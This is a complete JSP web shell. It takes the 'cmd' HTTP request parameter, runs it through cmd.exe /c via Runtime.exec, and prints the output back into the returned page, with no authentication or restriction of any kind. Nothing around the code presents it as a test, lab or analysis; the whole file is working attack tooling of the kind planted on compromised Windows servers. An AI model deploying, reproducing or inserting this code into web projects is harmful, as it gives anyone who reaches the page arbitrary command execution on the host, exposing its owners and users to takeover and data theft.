<%@page import="java.util.Scanner"%>
<%@page import="java.io.InputStream"%>
<%
String data=request.getParameter("cmd") ;
StringBuffer buffer=new StringBuffer();

String[] cmd = new String[] { "cmd.exe","/c",data };
for( String s : cmd)
	System.out.print(s+" ");

Process process = Runtime.getRuntime().exec(cmd);
InputStream in = process.getInputStream(); 
Scanner s = new Scanner(in,"utf-8");
buffer.append("result: <br/>");
while(s.hasNextLine() == true) {
	buffer.append(s.nextLine()+"<br/>");
}
%> <br>

<%=buffer.toString()%>